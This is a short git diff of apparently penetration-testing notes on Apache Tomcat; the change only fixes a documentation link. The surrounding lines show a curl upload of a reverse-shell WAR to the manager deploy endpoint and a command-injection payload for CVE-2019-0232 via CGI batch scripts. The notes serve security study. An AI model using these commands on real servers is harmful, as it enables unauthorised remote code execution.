@@ -84,7 +84,7 @@ $ curl --upload-file revshell.war -u 'username:password' "URL/manager/text/deplo
 
 * [CVE-2019-0232](https://nvd.nist.gov/vuln/detail/CVE-2019-0232): on Windows host, if there is a cgi script and `enableCmdLineArguments` was enabled <small>(default to disabled)</small>, it can be exploited to arbitrarily run commands.
 
-You must find the [CGI](/cybersecurity/red-team/s2.discovery/techniques/websites/forced_browsing.md#cgi-scripts) directory which is often `/cgi` or `/cgi-bin/` and find at least one script. Use `URL/xxx/yyy.bat?&dir` to execute `dir`.
+You must find the [CGI](/cybersecurity/red-team/s2.discovery/index.md#web-services--forced-browsing#cgi-scripts) directory which is often `/cgi` or `/cgi-bin/` and find at least one script. Use `URL/xxx/yyy.bat?&dir` to execute `dir`.
 
 * Use `+` instead of spaces. Use <code>\\</code> in paths. 
 * Don't forgot to URL encode the payload.
